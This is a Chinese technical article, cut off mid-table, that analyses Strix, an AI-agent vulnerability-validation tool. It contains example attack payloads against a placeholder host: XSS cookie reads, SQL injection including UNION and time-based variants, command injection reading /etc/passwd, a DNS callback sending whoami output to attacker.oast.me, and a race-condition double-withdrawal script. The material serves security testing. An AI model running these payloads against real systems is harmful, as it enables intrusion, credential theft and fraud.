#  Strix AI驱动的漏洞动态验证能力分析  
原创 孙志敏
                    孙志敏  AI与安全   2026-01-17 02:01  
  
摘要：  
  
传统 SAST 工具只能发现“可能有问题的代码”，却无法确认漏洞是否真的可被利用，导致高误报率和大量人工复核成本。  
  
Strix 采用“静态分析 + 动态验证”的混合模式  
：  
- 先通过静态分析定位可疑点  
  
- 再通过浏览器自动化、HTTP 代理、命令执行沙箱和 Python 脚本，对漏洞进行真实攻击验证  
  
只有在验证成功、有可复现 PoC 和明确影响的情况下，漏洞才会被确认。  
  
通过这种“验证优先”的设计，Strix 能显著降低误报率，并支持包括 SQL 注入、XSS、RCE、SSRF、IDOR、竞态条件等在内的 17 类漏洞的专业级验证，真正把扫描结果从“风险提示”升级为“可行动的安全结论”。  
  
本文较长，9800字，阅读约需25分钟。  
  
  
  
传统静态应用安全测试（SAST）工具通过分析源代码识别潜在漏洞，但存在明显局限，就是高误报率，因为上下语言缺失，复杂逻辑盲区等问题，无法准确确认漏洞是否可利用，要解决这个问题，只有通过动态验证。  
  
比如这样一行代码：  
```
query = "SELECT * FROM users WHERE id = " + user_input
```  
  
  
这是个典型的SQL注入代码，但问题来了：  
- 这个   
user_input  
 在传入之前是否已经被过滤了？  
  
- 数据库是否有额外的权限限制？  
  
- Web 应用防火墙（WAF）会不会拦截恶意请求？  
  
仅看代码，你无法回答这些问题。传统静态分析工具的困境正在于此——它只能说"这里  
可能  
有问题"，却无法确认"这里  
确实  
有问题"。  
  
基于这些问题，传统的SAST扫描工具的误报率一般在30%以上。  
  
1.Strix 的思路  
  
Strix 采用  
静态分析 + 动态验证  
的混合方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rhmRSVBNbicozcJ4ERaO0c7bgQGe122uR1hbAZwibkRzuicMryiathsz7Dqnl1aTGmzWpSZYrN2Z4MItTJ9W29stgQ/640?from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
核心理念：验证成功的漏洞者才是漏洞，所有的验证成功，都有POC和影响评估。  
  
2. 整体架构设计  
  
漏洞验证是非常复杂的事情，需要一个完整的体系设计，尤其是运行系统。  
  
2.1 分层架构  
  
Strix 的漏洞验证采用三层架构设计：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rhmRSVBNbicozcJ4ERaO0c7bgQGe122uRaHx7VLIgMCObIoNppIFrZeGut1x3IHj2bicPfqUUuz5LSClJyyB45fg/640?from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
2.2 核心组件说明  
<table><tbody><tr><td style="color:rgb(0, 0, 0);font-weight:bold;text-align:center;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">组件</span></section></td><td style="color:rgb(0, 0, 0);font-weight:bold;text-align:center;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">职责</span></section></td><td style="color:rgb(0, 0, 0);font-weight:bold;text-align:center;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">源码位置</span></section></td></tr><tr><td style="color:rgb(0, 0, 0);font-weight:bold;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">StrixAgent</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">主控代理，负责任务规划和结果汇总</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">strix/agents/StrixAgent/</span></section></td></tr><tr><td style="color:rgb(0, 0, 0);font-weight:bold;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">BaseAgent</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">代理基类，提供LLM交互和工具调用能力</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">strix/agents/base_agent.py</span></section></td></tr><tr><td style="color:rgb(0, 0, 0);font-weight:bold;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">Tool Server</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">沙箱内的工具服务，暴露REST API</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">strix/runtime/tool_server.py</span></section></td></tr><tr><td style="color:rgb(0, 0, 0);font-weight:bold;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">DockerRuntime</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">容器生命周期管理</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">strix/runtime/docker_runtime.py</span></section></td></tr><tr><td style="color:rgb(0, 0, 0);font-weight:bold;word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">漏洞模块</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">17种漏洞的专业知识库</span></section></td><td style="color:rgb(0, 0, 0);word-wrap:break-word;word-break:break-word;white-space:pre-wrap;border-top:0.5pt solid #1f2329;border-right:0.5pt solid #1f2329;border-bottom:0.5pt solid #1f2329;border-left:0.5pt solid #1f2329;"><section><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">strix/prompts/vulnerabilities/</span></section></td></tr></tbody></table>  
  
图中的关键是沙箱功能，这个沙箱的Web测试能力非常强，同时，由于使用沙箱，可以保证测试过程的安全性。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rhmRSVBNbicozcJ4ERaO0c7bgQGe122uRwrAy8n6VbtGYBZlwLgicUKUNtmyxNraJMOicabtJ3up3MPvufns6NJfA/640?from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
3.四大动态验证工具  
  
Strix 提供四种核心工具用于动态漏洞验证，每种工具针对不同类型的漏洞。  
  
3.1 Browser Tool - 浏览器自动化  
  
适用漏洞类型  
：XSS、CSRF、认证绕过、点击劫持、DOM操纵  
  
技术实现  
：基于 Playwright 的无头浏览器控制  
```
# 源码: strix/tools/browser/browser_actions.py
BrowserAction = Literal[
    # 导航操作
    "launch",      # 启动浏览器
    "goto",        # 访问URL
    "back",        # 后退
    "forward",     # 前进
    # 交互操作
    "click",       # 点击坐标
    "double_click",# 双击
    "type",        # 输入文本
    "hover",       # 悬停
    "press_key",   # 按键
    "scroll_down", # 向下滚动
    "scroll_up",   # 向上滚动
    # 高级操作
    "execute_js",       # 执行JavaScript (关键!)
    "get_console_logs", # 获取控制台日志
    "view_source",      # 查看页面源码
    # 标签页管理
    "new_tab",     # 新建标签页
    "switch_tab",  # 切换标签页
    "close_tab",   # 关闭标签页
    "list_tabs",   # 列出所有标签页
]
```  
  
  
XSS 验证示例  
：  
  
  
步骤1: 启动浏览器browser_action(action="launch")步骤2: 访问包含XSS payload的URLbrowser_action(    action="goto",    url="http://target.com/search?q=<script>alert(document.cookie)</script>")步骤3: 检查控制台是否有脚本执行的证据logs = browser_action(action="get_console_logs")步骤4: 执行JS验证DOM状态result = browser_action(    action="execute_js",    js_code="return document.body.innerHTML.includes('<script>')")步骤5: 尝试获取敏感信息证明影响cookie = browser_action(    action="execute_js",    js_code="return document.cookie")  
  
3.2 Proxy Tool - HTTP 代理拦截  
  
适用漏洞类型  
：SQL注入、SSRF、API漏洞、认证问题、IDOR  
  
技术实现  
：集成 Caido 代理，支持请求拦截、修改和重放  
```
# 源码: strix/tools/proxy/proxy_actions.py
@register_tool
def send_request(
    method: str,           # HTTP方法
    url: str,              # 目标URL
    headers: dict | None,  # 自定义请求头
    body: str = "",        # 请求体
    timeout: int = 30,     # 超时时间
) -> dict[str, Any]:
    """发送自定义HTTP请求并通过代理捕获"""
    ...
@register_tool
def repeat_request(
    request_id: str,                    # 原请求ID
    modifications: dict[str, Any] | None,  # 修改内容
) -> dict[str, Any]:
    """重放请求并应用修改"""
    ...
@register_tool
def list_requests(
    httpql_filter: str | None = None,   # HTTPQL过滤语法
    sort_by: str = "timestamp",
    sort_order: str = "desc",
) -> dict[str, Any]:
    """列出捕获的请求"""
    ...
@register_tool
def view_request(
    request_id: str,
    part: Literal["request", "response"] = "request",
    search_pattern: str | None = None,  # 正则搜索
) -> dict[str, Any]:
    """查看请求/响应详情"""
    ...
```  
  
  
SQL 注入验证示例  
：  
```
# 步骤1: 发送正常请求作为基准
baseline = send_request(
    method="GET",
    url="http://target.com/api/user?id=1",
)
# 响应: {"id": 1, "name": "Alice"}, 200 OK, 45 bytes
# 步骤2: 发送 Boolean-based 测试 (TRUE条件)
true_test = send_request(
    method="GET",
    url="http://target.com/api/user?id=1' AND '1'='1",
)
# 响应: {"id": 1, "name": "Alice"}, 200 OK, 45 bytes
# 步骤3: 发送 Boolean-based 测试 (FALSE条件)
false_test = send_request(
    method="GET",
    url="http://target.com/api/user?id=1' AND '1'='2",
)
# 响应: {}, 200 OK, 2 bytes
# 分析: TRUE条件返回数据，FALSE条件返回空 → SQL注入确认!
# 步骤4: 提取数据验证影响
extract = send_request(
    method="GET",
    url="http://target.com/api/user?id=1' UNION SELECT version(),user()--",
)
# 响应包含: MySQL 8.0.32, root@localhost → 可提取敏感信息
```  
  
  
3.3 Terminal Tool - 终端命令执行  
  
适用漏洞类型  
：RCE、命令注入、文件包含、路径遍历  
  
技术实现  
：交互式 Shell 会话管理  
```
# 源码: strix/tools/terminal/terminal_actions.py
@register_tool
def terminal_execute(
    command: str,              # 要执行的命令
    is_input: bool = False,    # 是否为交互式输入
    timeout: float | None = None,
    terminal_id: str | None = None,  # 终端会话ID
    no_enter: bool = False,    # 是否不发送回车
) -> dict[str, Any]:
    """在终端中执行命令"""
    ...
```  
  
  
命令注入验证示例  
：  
```
# 步骤1: 测试基本命令注入
terminal_execute(
    command="curl 'http://target.com/api/ping?host=127.0.0.1;id'"
)
# 如果响应包含 "uid=1000(www-data)" → 命令注入确认
# 步骤2: 使用 Out-of-Band 验证 (DNS回调)
terminal_execute(
    command="curl 'http://target.com/api/ping?host=$(whoami).attacker.oast.me'"
)
# 检查 DNS 日志是否收到 "www-data.attacker.oast.me" 请求
# 步骤3: 尝试读取敏感文件
terminal_execute(
    command="curl 'http://target.com/api/ping?host=;cat /etc/passwd'"
)
```  
  
  
3.4 Python Tool - 自定义脚本运行时  
  
适用漏洞类型  
：所有复杂漏洞、需要自定义逻辑的验证、竞态条件  
  
技术实现  
：独立 Python 解释器会话  
```
# 源码: strix/tools/python/python_actions.py
PythonAction = Literal["new_session", "execute", "close", "list_sessions"]
@register_tool
def python_action(
    action: PythonAction,
    code: str | None = None,    # Python代码
    timeout: int = 30,          # 执行超时
    session_id: str | None = None,
) -> dict[str, Any]:
    """执行Python代码"""
    ...
```  
  
  
时间盲注验证示例  
：  
```
python_action(
    action="execute",
    code="""
import requests
import time
def test_time_based_sqli(url, payload, delay=5):
    '''时间盲注测试'''
    start = time.time()
    try:
        requests.get(f"{url}?id={payload}", timeout=delay+5)
    except:
        pass
    elapsed = time.time() - start
    return elapsed >= delay
# 测试目标
target = "http://target.com/api/user"
# Payload: 如果条件为真，延迟5秒
payload = "1' AND IF(1=1, SLEEP(5), 0)--"
if test_time_based_sqli(target, payload):
    print("TIME-BASED SQL INJECTION CONFIRMED!")
    print(f"Payload: {payload}")
    print(f"Response delayed by ~5 seconds")
else:
    print("Not vulnerable to time-based SQLi")
""",
    timeout=60,
)
```  
  
  
竞态条件验证示例  
：  
```
python_action(
    action="execute",
    code="""
import asyncio
import aiohttp
async def race_condition_test():
    '''竞态条件测试 - 双花攻击'''
    async def withdraw(session, amount):
        return await session.post(
            'http://target.com/api/withdraw',
            json={'amount': amount}
        )
    # 并发发送多个提现请求
    async with aiohttp.ClientSession() as session:
        # 账户余额: $100, 尝试同时提现 $100 两次
        tasks = [withdraw(session, 100) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        success_count = sum(1 for r in results if r.status == 200)
        print(f"Successful withdrawals: {success_count}")
        if success_count > 1:
            print("RACE CONDITION CONFIRMED!")
            print("Multiple withdrawals succeeded with insufficient balance")
asyncio.run(race_condition_test())
""",
    timeout=30,
)
```  
  
  
4. 漏洞验证方法(Prompt)  
  
Strix 为每种漏洞类型定义了专业的验证方法，存储在   
strix/prompts/vulnerabilities/  
 目录下。  
  
4.1 验证漏洞的Prompt结构  
  
每个漏洞模块包含以下关键部分：  
```
<vulnerability_guide>
    <title>漏洞名称</title>
    <critical>核心要点</critical>
    <scope>适用范围</scope>
    <methodology>测试方法论</methodology>
    <detection_channels>检测通道</detection_channels>
    <advanced_techniques>高级技术</advanced_techniques>
    <validation>验证标准</validation>
    <false_positives>误报识别</false_positives>
    <impact>影响评估</impact>
    <pro_tips>专家建议</pro_tips>
</vulnerability_guide>
```  
  
  
4.2 SQL 注入验证  
```
<!-- 源码: strix/prompts/vulnerabilities/sql_injection.jinja -->
<methodology>
1. 识别查询形态: SELECT/INSERT/UPDATE/DELETE, WHERE/ORDER/GROUP/LIMIT 子句
2. 确认注入类别: 反射错误、布尔差异、时间延迟、带外回调
3. 建立最小提取通道: UNION (可见时)、错误回显、布尔位提取、时间延迟、OAST/DNS
4. 获取元数据和高价值表，尝试写入操作 (认证绕过、角色修改)
</methodology>
<detection_channels>
- Error-based: 触发类型/约束/解析器错误，暴露堆栈/版本/路径
- Boolean-based: 配对请求仅在谓词真假上有差异，对比状态/响应体/长度/ETag
- Time-based: SLEEP/pg_sleep/WAITFOR; 使用子查询避免全局延迟噪声
- Out-of-band (OAST): 通过数据库特定原语进行 DNS/HTTP 回调
</detection_channels>
<validation>
1. 展示可靠的 oracle (error/boolean/time/OAST)，通过切换谓词证明控制
2. 使用建立的通道提取可验证的元数据 (version, current_user, database)
3. 在合法范围内检索或修改非平凡目标 (表行, 角色标志)
4. 提供仅在注入片段上有差异的可重现请求
5. 如适用，展示绕过 WAF 防御的变体
</validation>
<false_positives>
- 与 SQL 解析或约束无关的通用错误
- 由于模板而非谓词真值导致的静态响应大小
- 与注入函数无关的网络/CPU 人工延迟
- 通过代码审查验证的参数化查询（无字符串拼接）
</false_positives>
```  
  
  
4.3 XSS 验证  
```
<!-- 源码: strix/prompts/vulnerabilities/xss.jinja -->
<methodology>
1. 识别来源 (URL/query/hash/referrer, postMessage, storage, WebSocket) 并追踪到接收器
2. 分类接收器上下文: HTML节点、属性、URL、脚本块、事件处理器、JS eval、CSS、SVG
3. 确定当前防御: 输出编码、净化器、CSP、Trusted Types、DOMPurify配置、框架自动转义
4. 按上下文构造最小 payload; 迭代编码/空白/大小写/DOM变异变体; 通过可观察副作用确认
</methodology>
<validation>
1. 提供最小 payload 和上下文 (sink类型)，附带前后 DOM 或网络证据
2. 展示跨浏览器执行 (相关时) 或解释解析器特定行为
3. 证明绕过声明的防御 (sanitizer设置, CSP/Trusted Types)
4. 量化超越 alert 的影响: 访问的数据, 执行的操作, 实现的持久化
</validation>
<frameworks>
<react>
- 主要接收器: dangerouslySetInnerHTML; 次要: 从不可信输入设置事件处理器或URL
- 绕过模式: 通过库的未净化HTML; 底层使用innerHTML的自定义渲染器
</react>
<vue>
- 接收器: v-html 和动态属性绑定; 服务端渲染水合不匹配
- 防御: 避免对不可信输入使用v-html; 严格净化
</vue>
</frameworks>
```  
  
  
4.4 其他漏洞类型  
  
Strix 支持以下 17 种漏洞类型的专业验证：  
<table><tbody><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">漏洞类型</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">模块文件</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">主要验证方法</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">SQL 注入</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">sql_injection.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">Error/Boolean/Time/OAST</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">XSS</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">xss.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">DOM执行验证、CSP绕过</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">XXE</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span style="margin: 0 3px;background-color: rgb(245, 246, 247);border-radius: 4px;padding: 0 2px;border: 1px solid rgb(222, 224, 227);font-family: SourceCodeProMac;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">xxe.jinja</span></span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">外部实体解析、OAST</span></section></td></tr><tr><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI Emoji&#34;, &#34;Segoe UI Symbol&#34;, &#34;Noto Color Emoji&#34;;color: rgb(31, 35, 41);text-align: left;font-size: 16px;line-height: 26px;word-break: break-word;margin-top: 0px;margin-bottom: 8px;min-height: 20px;"><span leaf="" style="color: rgb(31, 35, 41);font-size: 16px;">RCE</span></section></td><td style="padding: 8px;"><section style="white-space-collapse: break-spaces;font-family: LarkHackSafariFont, LarkEmojiFont, LarkChineseQuote, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, Tahoma, &#34;PingFang SC&#34;, &#34;Microsoft Yahei&#34;, Arial, &#34;Hiragino Sans GB&#34;, sans-serif, &#34;Apple Color Emoji&#34;, &#34;Segoe UI 